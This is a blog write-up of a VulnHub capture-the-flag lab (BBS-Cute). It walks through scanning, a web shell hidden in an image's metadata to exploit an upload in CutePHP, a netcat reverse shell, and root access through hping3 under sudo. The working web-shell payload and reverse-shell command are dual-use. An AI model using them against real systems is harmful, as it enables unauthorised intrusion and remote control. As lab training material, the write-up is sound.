---
title: WRITE-UP BBS-Cute
date: 2024-07-26 16:59:59 +0700
categories: [write up, vulnhub, red team, oscp]
tags: [vulnhub]     # TAG names should always be lowercase
---

# Write-up BBS-cute

## 1. Enumeration

i used ```netdiscover```  to see real IP mylab

``` terminal
netdiscover
```

![alt text](/assets/img/BBS_cute/bbs_cute_netdiscover.png)
 
ip is :> ``` 192.168.137.112 ```

i used nmap to see port open 

```terminal
sudo nmap -sC -sV -vvv -p- --min-rate=1000 192.168.137.112
```

*   sC : Enable default script to quick and safe
*   sV : Detect service
*   vvv : increase verbosity
*   p : port to scan "-p-" is all port 1-65535
*   min-rate=1000 : packets are sent < 1000s

![alt text](/assets/img/BBS_cute/bbs_cute_nmap.png)

* 22 is ssh
* 995-110 is mail
* 80 is http apache httpd
* 88 is http nginx

so i used dirsearch to check subfolder of this site and i used default command

```
dirsearch -u http://192.168.137.112 -e 403,404
dirsearch -u http://192.168.137.112:88 -e 403,404
```

port 88 don't have anything i see in port 80 using 
```CutePHP 2.1.2 ```

![alt text](/assets/img/BBS_cute/bbs_cute_dirsearch.png)


i check 110-995 and they don't have information for me to take some thing
## 2. Post Exploitation
so i decided register to take a acount
  
![alt text](/assets/img/BBS_cute/bbs_cute_login.png)

after insite have update account permit me can upload avatar and i used polygot trick add code in command file image because it's receive magic header so i can't upload shell in normal

```
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' /home/kali/Desktop/cat.jpeg
```

after that's we get ``` www-data ``` baby :v

![alt text](/assets/img/BBS_cute/bbs_cute_www-data.png)

## 3. Privilage Escalation

I always spawn a shell in terminal :> Because i OCD :D
```
nc -e /bin/sh 192.168.137.107 3008
```

![alt text](/assets/img/BBS_cute/bbs_cute_shell.png)

after check i can see user ```fox``` and flag :v and i think i need to check folder ``` maildir ```

![alt text](/assets/img/BBS_cute/bbs_cute_userflag.png)

but after check maildir i can't see anythings so i decided watch ```suid ```

```
find / -perm -4000 2>/dev/null
```

![alt text](/assets/img/BBS_cute/bbs_cute_suid.png)

i will check it with ```gtfobin``` with ```hping3``` but i can't go to root

i will use ``` sudo -l ``` to what ```NO PASSWD: ``` Trick :> maybe good or not :V

![alt text](/assets/img/BBS_cute/bbs_cute_sudo-l.png)

Still ```hping3``` :D (vietnam quote) :v van de ki nang roi chu deo phai do de do may ngu day

![alt text](/assets/img/BBS_cute/bbs_cute_root.png)

after stuck i missed syntax my bad for all 

but i still root :< waste more time i think 

## GG -_-
